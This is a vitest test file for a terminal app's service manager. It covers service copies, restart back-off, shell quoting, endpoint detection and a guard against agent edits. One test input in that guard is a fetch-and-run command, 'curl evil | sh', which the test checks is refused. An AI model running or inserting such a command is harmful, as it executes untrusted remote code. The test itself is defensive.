import { describe, expect, it } from 'vitest';
import {
  checkoutInCommand, copyKey, copyRefusal, copyTabName, copyTargetsOf, copyTitle, detectEndpoint, dueCopies, exitIsCrash, importVerdict,
  intentPatch, isHumanDefined, launchableUrl, moveVerb, parseCopyKey, pickCopy, placeholdersIn, publishRow, refusedAgentEdits, restartAllowed, restartDelay,
  restorePlan, rollupStatus, runsManyCopies, sameService, sharesByDefault, shq, startIntent, startLine, targetLabel, RESTART_WINDOW_MS,
} from './model';

describe('copies (docs/hive.md §6.9)', () => {
  const sid = '2b1c6f1e-0000-4000-8000-000000000000';

  it('keys the own folder by the bare service id, as before copies existed', () => {
    expect(copyKey(sid)).toBe(sid);
    expect(copyKey(sid, '')).toBe(sid);
    expect(parseCopyKey(sid)).toEqual({ serviceId: sid, target: '' });
  });

  it('round-trips a copy key, including a target with @ in a path', () => {
    for (const target of ['branch:session-store', 'checkout:/Users/d/My Proj@2/web', 'branch:a/b']) {
      expect(parseCopyKey(copyKey(sid, target))).toEqual({ serviceId: sid, target });
    }
  });

  it('labels a copy before Rust has, and titles its row and tab', () => {
    expect(targetLabel('')).toBe('main');
    expect(targetLabel('branch:feature/x')).toBe('feature/x');
    expect(targetLabel('checkout:/hive/w/alpha/')).toBe('alpha');
    expect(copyTitle('web', '')).toBe('web');
    expect(copyTitle('web', 'branch:session-store', { label: 'session-store', commit: '3f2a91c' })).toBe('web · on session-store@3f2a91c');
    expect(copyTitle('web', 'branch:session-store')).toBe('web · on session-store');
    expect(copyTabName('web', '')).toBe('web');
    expect(copyTabName('web', 'branch:session-store')).toBe('web@session-store');
    expect(copyTabName('web', 'checkout:/x/alpha', 'alpha')).toBe('web@alpha');
  });

  it('reads placeholders as Rust does, leaving every other brace alone', () => {
    expect(placeholdersIn('vite --port {port} --hmr {port2} {port:db}')).toEqual(['port', 'port2', 'port:db']);
    expect(placeholdersIn('{{port}}')).toEqual(['port']);
    for (const t of ['cp a.{js,map} out', 'echo ${PORT}', '{"port": 1}', '{Port}', '{ port }', '{port:}', '{branch']) {
      expect(placeholdersIn(t)).toEqual([]);
    }
    expect(runsManyCopies({ command: 'npm run dev', env: [['PORT', '{port}']] })).toBe(true);
    expect(runsManyCopies({ command: 'npm run dev -- --port 5173', env: [] })).toBe(false);
    expect(runsManyCopies({ command: 'x {port2}', env: [] })).toBe(false);
    expect(checkoutInCommand('ls {checkout}')).toBe(true);
    expect(checkoutInCommand('ls')).toBe(false);
  });

  it('refuses a second copy of a fixed-port service and a fourth of any', () => {
    const fixed = { name: 'web', command: 'npm run dev', env: [] as [string, string][] };
    const many = { name: 'web', command: 'vite --port {port}', env: [] as [string, string][] };
    const main = { target: '', label: 'main' };
    const a = { target: 'branch:a', label: 'a' };
    const b = { target: 'branch:b', label: 'b' };
    expect(copyRefusal(fixed, [], 'branch:a')).toBeNull();
    expect(copyRefusal(fixed, [main], '')).toBeNull();
    expect(copyRefusal(fixed, [main], 'branch:a')).toContain('one copy at a time');
    expect(copyRefusal(many, [main, a], 'branch:b')).toBeNull();
    expect(copyRefusal(many, [main, a, b], 'branch:c')).toContain('3 copies');
    expect(copyRefusal(many, [main, a, b], 'branch:a')).toBeNull();
  });

  it('picks the named copy, the only running one, else the own folder; several is refused', () => {
    const live = [{ target: '', label: 'main' }, { target: 'branch:a', label: 'a' }];
    expect(pickCopy([], null)).toEqual({ target: '' });
    expect(pickCopy([live[1]], null)).toEqual({ target: 'branch:a' });
    expect(pickCopy(live, null)).toEqual({ ambiguous: ['main', 'a'] });
    expect(pickCopy(live, 'branch:b')).toEqual({ target: 'branch:b' });
    expect(pickCopy(live, '')).toEqual({ target: '' });
  });

  it('gives a service that never ran elsewhere exactly one copy, its own folder', () => {
    const tabs = [{ service_id: sid }, { service_id: 'other' }, { service_id: null }];
    expect(copyTargetsOf(sid, [sid, 'other'], tabs, undefined)).toEqual(['']);
    expect(copyTargetsOf(sid, [], [], [])).toEqual(['']);
    // Rows, tabs and intent each add a copy, once, in that order.
    expect(copyTargetsOf(
      sid,
      [copyKey(sid, 'branch:b'), copyKey('other', 'branch:z')],
      [{ service_id: sid, service_target: 'checkout:/w/a' }, { service_id: sid, service_target: 'branch:b' }],
      ['branch:c', 'branch:b'],
    )).toEqual(['', 'branch:b', 'checkout:/w/a', 'branch:c']);
  });

  it('records intent on was_running for the own folder, exactly as before', () => {
    expect(intentPatch({ was_running: false }, '', true)).toEqual({ was_running: true });
    expect(intentPatch({}, '', true)).toEqual({ was_running: true });
    expect(intentPatch({ was_running: true }, '', true)).toBeNull();
    expect(intentPatch({}, '', false)).toBeNull();
    expect(intentPatch({ was_running: true, running_targets: ['branch:a'] }, '', false)).toEqual({ was_running: false });
  });

  it('records a copy elsewhere in running_targets and leaves was_running alone', () => {
    expect(intentPatch({ was_running: true }, 'branch:a', true)).toEqual({ running_targets: ['branch:a'] });
    expect(intentPatch({ running_targets: ['branch:a'] }, 'branch:a', true)).toBeNull();
    expect(intentPatch({ running_targets: ['branch:a', 'branch:b'] }, 'branch:a', false)).toEqual({ running_targets: ['branch:b'] });
    expect(intentPatch({}, 'branch:a', false)).toBeNull();
  });

  it('brings back what it always did, and each copy on its own checkout', () => {
    // Legacy: activation starts auto_start or left-running; launch starts left-running only.
    expect(dueCopies({}, 'activation')).toEqual({ own: true, targets: [] });
    expect(dueCopies({ auto_start: false }, 'activation')).toEqual({ own: false, targets: [] });
    expect(dueCopies({ auto_start: false, was_running: true }, 'activation')).toEqual({ own: true, targets: [] });
    expect(dueCopies({ auto_start: true }, 'launch')).toEqual({ own: false, targets: [] });
    expect(dueCopies({ was_running: true }, 'launch')).toEqual({ own: true, targets: [] });
    // Copies: `auto_start` is the own folder's alone; intent brings each back.
    expect(dueCopies({ auto_start: false, running_targets: ['branch:a', ''] }, 'activation')).toEqual({ own: false, targets: ['branch:a'] });
    expect(dueCopies({ running_targets: ['branch:a'] }, 'launch')).toEqual({ own: false, targets: ['branch:a'] });
    // Shared: never started here.
    expect(dueCopies({ was_running: true, running_targets: ['branch:a'], shared_from: { workspace_id: 'w', service_id: 's' } }, 'launch'))
      .toEqual({ own: false, targets: [] });
  });

  it('restores exactly what dueCopies always did for a service that only ran on its own folder', () => {
    const none = () => false;
    const oneCopy = { command: 'npm run dev' };
    expect(restorePlan(oneCopy, 'activation', none)).toEqual(['']);
    expect(restorePlan({ ...oneCopy, auto_start: false }, 'activation', none)).toEqual([]);
    expect(restorePlan({ ...oneCopy, auto_start: false, was_running: true }, 'activation', none)).toEqual(['']);
    expect(restorePlan({ ...oneCopy, auto_start: true }, 'launch', none)).toEqual([]);
    expect(restorePlan({ ...oneCopy, was_running: true }, 'launch', none)).toEqual(['']);
    // A shell that survived a window reload is still running it: not started again.
    expect(restorePlan({ ...oneCopy, was_running: true }, 'activation', (t) => t === '')).toEqual([]);
    expect(restorePlan({ ...oneCopy, was_running: true, shared_from: { workspace_id: 'w', service_id: 's' } }, 'launch', none)).toEqual([]);
  });

  it('brings a moved one-copy service back where it was moved, not on its own folder', () => {
    const none = () => false;
    const moved = { command: 'npm run dev', auto_start: true, was_running: false, running_targets: ['branch:session-store'] };
    expect(restorePlan(moved, 'activation', none)).toEqual(['branch:session-store']);
    expect(restorePlan(moved, 'launch', none)).toEqual(['branch:session-store']);
    // After a window reload its branch copy is still up: nothing starts, least of all a second
    // fixed-port instance on the own folder.
    expect(restorePlan(moved, 'activation', (t) => t === 'branch:session-store')).toEqual([]);
    // Bad intent naming two places brings back one, never a refused second.
    expect(restorePlan({ ...moved, was_running: true }, 'launch', none)).toHaveLength(1);
  });

  it('starts the copies left running before the auto_start own folder, within the limit', () => {
    const none = () => false;
    const copies = { command: 'vite --port {port}', auto_start: true, running_targets: ['branch:a', 'branch:b', 'branch:c'] };
    expect(restorePlan(copies, 'activation', none)).toEqual(['branch:a', 'branch:b', 'branch:c']);
    expect(restorePlan({ ...copies, running_targets: ['branch:a'] }, 'activation', none)).toEqual(['branch:a', '']);
    expect(restorePlan({ ...copies, was_running: true, running_targets: ['branch:a'] }, 'activation', none)).toEqual(['', 'branch:a']);
    expect(restorePlan({ ...copies, running_targets: ['branch:a', 'branch:b'] }, 'activation', (t) => t === 'branch:a')).toEqual(['branch:b', '']);
  });

  it('records a start of the own folder exactly as intentPatch did', () => {
    expect(startIntent({ command: 'npm run dev' }, '')).toEqual({ was_running: true });
    expect(startIntent({ command: 'npm run dev', was_running: true }, '')).toBeNull();
    expect(startIntent({ command: 'vite --port {port}' }, '')).toEqual({ was_running: true });
    expect(startIntent({ command: 'vite --port {port}', was_running: true, running_targets: ['branch:a'] }, 'branch:b'))
      .toEqual({ running_targets: ['branch:a', 'branch:b'] });
  });

  it('never leaves a one-copy service with intent in two places', () => {
    const svc = { command: 'npm run dev' };
    expect(startIntent({ ...svc, was_running: true }, 'branch:x')).toEqual({ was_running: false, running_targets: ['branch:x'] });
    expect(startIntent({ ...svc, running_targets: ['branch:x'] }, '')).toEqual({ was_running: true, running_targets: [] });
    expect(startIntent({ ...svc, running_targets: ['branch:x', 'branch:y'] }, 'branch:y')).toEqual({ running_targets: ['branch:y'] });
    expect(startIntent({ ...svc, running_targets: ['branch:y'] }, 'branch:y')).toBeNull();
  });

  it('moves a crashed copy like a live one', () => {
    const one = { command: 'npm run dev' };
    const many = { command: 'vite --port {port}' };
    const crashedOwn = [{ target: '', live: false, status: 'crashed' as const }];
    // Run on from the crashed own row, and restartService { on } with no row.
    expect(moveVerb(one, crashedOwn, 'branch:x', '')).toEqual({ verb: 'retarget', from: '' });
    expect(moveVerb(one, crashedOwn, 'branch:x', null)).toEqual({ verb: 'retarget', from: '' });
    expect(moveVerb(many, crashedOwn, 'branch:x', '')).toEqual({ verb: 'retarget', from: '' });
    // A copy on another row's menu adds beside a crashed one only for a service that runs copies.
    expect(moveVerb(many, crashedOwn, 'branch:x', 'branch:y')).toEqual({ verb: 'start' });
    expect(moveVerb(one, crashedOwn, 'branch:x', 'branch:y')).toEqual({ verb: 'retarget', from: '' });
  });

  it('decides Run on / restartService { on } as before for live and stopped copies', () => {
    const one = { command: 'npm run dev' };
    const many = { command: 'vite --port {port}' };
    const ownUp = [{ target: '', live: true, status: 'ready' as const }];
    expect(moveVerb(one, ownUp, '', null)).toEqual({ verb: 'restart' });
    expect(moveVerb(one, ownUp, 'branch:x', null)).toEqual({ verb: 'retarget', from: '' });
    expect(moveVerb(many, ownUp, 'branch:x', null)).toEqual({ verb: 'start' });
    expect(moveVerb(one, [{ target: '', live: false, status: 'stopped' }], 'branch:x', null)).toEqual({ verb: 'start' });
    // The own row's "Own folder" while a one-copy service runs on a branch brings it back.
    const onBranch = [{ target: '', live: false, status: 'stopped' as const }, { target: 'branch:x', live: true, status: 'running' as const }];
    expect(moveVerb(one, onBranch, '', '')).toEqual({ verb: 'retarget', from: 'branch:x' });
  });

  it('publishes the own folder row exactly as before, and a copy with where it runs', () => {
    const r = { status: 'ready' as const, note: null, since: 5, copy: { cwd: '/wt/web', label: 'session-store' } };
    expect(publishRow(sid, r)).toEqual({ service_id: sid, status: 'ready', note: null, since_ms: 5 });
    expect(publishRow(sid, { ...r, copy: null })).toEqual({ service_id: sid, status: 'ready', note: null, since_ms: 5 });
    expect(publishRow(copyKey(sid, 'branch:session-store'), r))
      .toEqual({ service_id: sid, status: 'ready', note: null, since_ms: 5, target: 'branch:session-store', cwd: '/wt/web', label: 'session-store' });
  });

  it('weighs a suggested import against what other workspaces run', () => {
    const running = [{ name: 'web', workspace: 'Main', command: 'npm run dev', cwd: '/p', port: 5173 }];
    expect(importVerdict({ command: 'npm run dev', cwd: '/p' }, running)).toMatchObject({ kind: 'refused' });
    expect(importVerdict({ command: 'npm run dev', cwd: '/p' }, running).detail).toContain('web in Main runs this on :5173');
    expect(importVerdict({ command: 'npm run dev -- --port {port}', cwd: '/p' }, running).kind).toBe('copies');
    expect(importVerdict({ command: 'npm run dev', cwd: '/other' }, running).kind).toBe('fixed');
    expect(importVerdict({ command: 'npm run dev', cwd: '/p' }, [{ ...running[0], port: null }]).kind).toBe('fixed');
  });

  it('shares only infrastructure by default, and lets a shared one stand in for its suggestion', () => {
    const offers = [
      { name: 'dev', command: 'npm run dev', cwd: '/p', source: 'package.json' },
      { name: 'worker', command: 'node worker.js', cwd: '/p', source: 'Procfile' },
      { name: 'compose', command: 'docker compose up', cwd: '/p', source: 'compose' },
    ];
    // The repo's own dev server can't be a reference a branch could never run.
    expect(sharesByDefault({ name: 'web', command: 'npm run dev', cwd: '/p' }, offers)).toBe(false);
    expect(sharesByDefault({ name: 'worker', command: 'node worker.js --verbose', cwd: '/p' }, offers)).toBe(false);
    // Compose, or something no suggestion names, is infrastructure.
    expect(sharesByDefault({ name: 'db', command: 'docker compose up', cwd: '/p' }, offers)).toBe(true);
    expect(sharesByDefault({ name: 'redis', command: 'redis-server', cwd: '/p' }, offers)).toBe(true);
    // A portless service of the same name (importVerdict says `fixed`, not `refused`) is still
    // the same service, so the reference covers it rather than clashing with it by name.
    expect(importVerdict({ command: 'docker compose up', cwd: '/p' }, [{ name: 'compose', workspace: 'Main', command: 'docker compose up', cwd: '/p', port: null }]).kind).toBe('fixed');
    expect(sameService({ name: 'compose', command: 'docker compose up', cwd: '/p' }, offers[2])).toBe(true);
    expect(sameService({ name: 'Compose', command: 'docker compose up -d', cwd: '/q' }, offers[2])).toBe(true);
    expect(sameService({ name: 'db', command: 'docker compose up', cwd: '/q' }, offers[2])).toBe(false);
  });

  it('counts a stopped copy elsewhere only while it is up in the rollup', () => {
    // The store's rollup adds a copy on another checkout as a non-auto-start row while it is
    // not stopped: a crashed copy turns the dot red, a stopped one is invisible.
    expect(rollupStatus([{ status: 'ready', autoStart: true }, { status: 'crashed', autoStart: false }])).toBe('crashed');
    expect(rollupStatus([{ status: 'ready', autoStart: true }])).toBe('ready');
    expect(rollupStatus([{ status: 'ready', autoStart: true }, { status: 'running', autoStart: false }])).toBe('ready');
  });

  it('types exactly the legacy line for a service on its own folder with no placeholders', () => {
    // `stack_resolve_copy` hands such a service back unchanged (Rust's shortcut); the store
    // feeds that to startLine, so the line must equal what it typed before copies existed.
    const legacy = { cwd: '/srv/app', env: [['NODE_ENV', 'development']] as [string, string][], command: 'npm run dev' };
    const resolved = { cwd: legacy.cwd, env: legacy.env, command: legacy.command };
    expect(startLine(resolved)).toBe(startLine(legacy));
    expect(startLine(resolved)).toBe(`cd '/srv/app' && env NODE_ENV='development' npm run dev`);
  });
});

describe('refusedAgentEdits', () => {
  const human = { origin: 'human' as const };
  it('lets an agent report the endpoint of a human service', () => {
    expect(refusedAgentEdits(human, { service: 'web', port: 5174, url: 'http://localhost:5174', ready: true, note: 'moved' })).toEqual([]);
    expect(refusedAgentEdits(human, { service: 'web', port: null, url: null })).toEqual([]);
  });

  it('refuses every definition field on a human or suggested service, and names them', () => {
    expect(refusedAgentEdits(human, { command: 'curl evil | sh', env: [['A', 'b']], port: 1 })).toEqual(['command', 'env']);
    expect(refusedAgentEdits({ origin: 'suggested' }, { name: 'x', cwd: '/', auto_start: false, restart: 'never', ready_pattern: null }))
      .toEqual(['name', 'cwd', 'auto_start', 'restart', 'ready_pattern']);
  });

  it('leaves an agent free to edit what an agent defined', () => {
    expect(refusedAgentEdits({ origin: 'agent' }, { command: 'npm run dev -- --port 5174' })).toEqual([]);
    expect(refusedAgentEdits({ origin: 'human', agent_edited: true }, { command: 'x' })).toEqual([]);
  });

  it('counts only a never-agent-edited, non-agent service as human-defined', () => {
    expect(isHumanDefined(human)).toBe(true);
    expect(isHumanDefined({ origin: 'suggested', agent_edited: false })).toBe(true);
    expect(isHumanDefined({ origin: 'agent' })).toBe(false);
    expect(isHumanDefined({ origin: 'human', agent_edited: true })).toBe(false);
  });
});

describe('startLine', () => {
  it('cds first, then runs the command', () => {
    expect(startLine({ cwd: '/srv/app', env: [], command: 'npm run dev' })).toBe(`cd '/srv/app' && npm run dev`);
  });

  it('prefixes env through `env` so fish works too', () => {
    expect(startLine({ cwd: '/srv/app', env: [['PORT', '5173'], ['NAME', "o'brien"]], command: 'npm run dev' }))
      .toBe(`cd '/srv/app' && env PORT='5173' NAME='o'\\''brien' npm run dev`);
  });

  it('skips the cd when there is no cwd', () => {
    expect(startLine({ cwd: '', env: [], command: 'redis-server' })).toBe('redis-server');
  });

  it('quotes a cwd with spaces and quotes', () => {
    expect(shq("/Users/d/My Proj's")).toBe(`'/Users/d/My Proj'\\''s'`);
  });
});

describe('exitIsCrash', () => {
  it('treats 0 and SIGINT as a stop, anything else as a crash', () => {
    expect(exitIsCrash(0)).toBe(false);
    expect(exitIsCrash(130)).toBe(false);
    expect(exitIsCrash(1)).toBe(true);
    expect(exitIsCrash(137)).toBe(true);
  });
});

describe('restart ceiling', () => {
  it('allows five restarts inside the window and refuses the sixth', () => {
    const now = 1_000_000_000;
    const recent = [1, 2, 3, 4].map((i) => now - i * 1000);
    expect(restartAllowed(recent, now)).toBe(true);
    expect(restartAllowed([...recent, now - 5000], now)).toBe(false);
  });

  it('forgets restarts older than the window', () => {
    const now = 1_000_000_000;
    const old = [1, 2, 3, 4, 5].map((i) => now - RESTART_WINDOW_MS - i * 1000);
    expect(restartAllowed(old, now)).toBe(true);
  });

  it('backs off and caps at 30s', () => {
    expect(restartDelay(0)).toBe(1000);
    expect(restartDelay(2)).toBe(4000);
    expect(restartDelay(99)).toBe(30000);
  });
});

describe('rollupStatus', () => {
  const row = (status: Parameters<typeof rollupStatus>[0][number]['status'], autoStart = true) => ({ status, autoStart });

  it('is null for an empty or fully stopped stack', () => {
    expect(rollupStatus([])).toBeNull();
    expect(rollupStatus([row('stopped'), row('stopped')])).toBeNull();
  });
  it('reports the worst thing first', () => {
    expect(rollupStatus([row('ready'), row('crashed')])).toBe('crashed');
    expect(rollupStatus([row('ready'), row('starting')])).toBe('starting');
  });
  it('is green only when every auto-start service is up', () => {
    expect(rollupStatus([row('ready'), row('running')])).toBe('ready');
    expect(rollupStatus([row('ready'), row('stopped')])).toBe('partial');
    // A stopped service that was never meant to auto-start does not count against it.
    expect(rollupStatus([row('ready'), row('stopped', false)])).toBe('ready');
  });
});

describe('detectEndpoint', () => {
  it('reads what the common dev servers actually print', () => {
    // Vite (the ➜ and colour are stripped before this runs), Next, CRA, Rails, Django.
    expect(detectEndpoint('  Local:   http://localhost:5173/')).toEqual({ port: 5173, url: 'http://localhost:5173' });
    expect(detectEndpoint('- Local:        http://localhost:3000')).toEqual({ port: 3000, url: 'http://localhost:3000' });
    expect(detectEndpoint('* Listening on http://127.0.0.1:3000')).toEqual({ port: 3000, url: 'http://127.0.0.1:3000' });
    expect(detectEndpoint('Starting development server at http://127.0.0.1:8000/')).toEqual({ port: 8000, url: 'http://127.0.0.1:8000' });
  });

  it('rewrites an every-interface host into one a browser can follow', () => {
    expect(detectEndpoint('Server running at http://0.0.0.0:8000/')).toEqual({ port: 8000, url: 'http://localhost:8000' });
    expect(detectEndpoint('listening on http://[::]:4000')).toEqual({ port: 4000, url: 'http://localhost:4000' });
  });

  it('takes a bare port when there is no scheme, and leaves it unlaunchable', () => {
    expect(detectEndpoint('Listening on port 8080')).toEqual({ port: 8080, url: null });
    expect(detectEndpoint('server listening on 0.0.0.0:4000')).toEqual({ port: 4000, url: null });
  });

  it('infers the implicit port and omits it from the url', () => {
    expect(detectEndpoint('proxy up at https://localhost')).toEqual({ port: 443, url: 'https://localhost' });
  });

  it('prefers the url over a bare port in the same banner', () => {
    expect(detectEndpoint('Listening on port 3000 — open http://localhost:3000/')).toEqual({ port: 3000, url: 'http://localhost:3000' });
  });

  it('ignores an address that is not this service', () => {
    // A start-up banner routinely carries a docs link and a LAN address.
    expect(detectEndpoint('  ready in 412 ms — docs at https://vitejs.dev/guide/')).toBeNull();
    expect(detectEndpoint('  Network: http://192.168.1.14:5173/')).toBeNull();
  });

  it('does not mistake ordinary output for an endpoint', () => {
    expect(detectEndpoint('running 5 tests, finished in 3:42')).toBeNull();
    expect(detectEndpoint('support 3000 concurrent users')).toBeNull();
    expect(detectEndpoint('compiled successfully in 1200ms')).toBeNull();
    expect(detectEndpoint('warning: 42 problems')).toBeNull();
  });

  it('rejects a port outside the valid range', () => {
    expect(detectEndpoint('http://localhost:99999')).toBeNull();
  });
});

describe('launchableUrl', () => {
  it('is the url only when there is a scheme to open', () => {
    expect(launchableUrl({ url: 'http://localhost:5173' })).toBe('http://localhost:5173');
    expect(launchableUrl({ url: null })).toBeNull();
    // A postgres endpoint is an address, not something a browser opens.
    expect(launchableUrl({ url: 'postgres://localhost:5432' })).toBeNull();
  });
});

describe('detectEndpoint — things that name a port but are not an address', () => {
  it('ignores the start line the pty echoes back', () => {
    // observeOutput is fed the raw pty stream, which carries the echo of the line maiTerm
    // typed. Believing it announces a port before the process has bound anything.
    expect(detectEndpoint(`cd '/srv/app' && uvicorn app:app --port 8000`)).toBeNull();
    expect(detectEndpoint(`cd '/srv/app' && php artisan serve --port=8000`)).toBeNull();
    expect(detectEndpoint(`cd '/srv/app' && PORT=5173 npm run dev`)).toBeNull();
  });

  it("ignores a runner echoing the script it is about to run", () => {
    expect(detectEndpoint('> app@1.0.0 dev\n> vite --port 5173')).toBeNull();
  });

  it('ignores a port the service failed to get', () => {
    // Vite and Next both print this BEFORE binding the port they actually take.
    expect(detectEndpoint('⚠ Port 3000 is in use, trying 3001 instead.')).toBeNull();
    expect(detectEndpoint('Port 5173 is in use, trying another one...')).toBeNull();
    expect(detectEndpoint('listen EADDRINUSE: address already in use :::4000')).toBeNull();
    expect(detectEndpoint('Error: could not bind to port 8080')).toBeNull();
  });

  it('takes the address from the line that has one, not the conflict above it', () => {
    const banner = [
      'Port 5173 is in use, trying another one...',
      '',
      '  ➜  Local:   http://localhost:5174/',
      '  ➜  Network: http://192.168.1.14:5174/',
    ].join('\n');
    expect(detectEndpoint(banner)).toEqual({ port: 5174, url: 'http://localhost:5174' });
  });

  it('still reads a genuine announcement with no url', () => {
    expect(detectEndpoint('Listening on port 8080')).toEqual({ port: 8080, url: null });
    expect(detectEndpoint('Serving HTTP on 0.0.0.0 port 8123 ...')).toEqual({ port: 8123, url: null });
  });
});
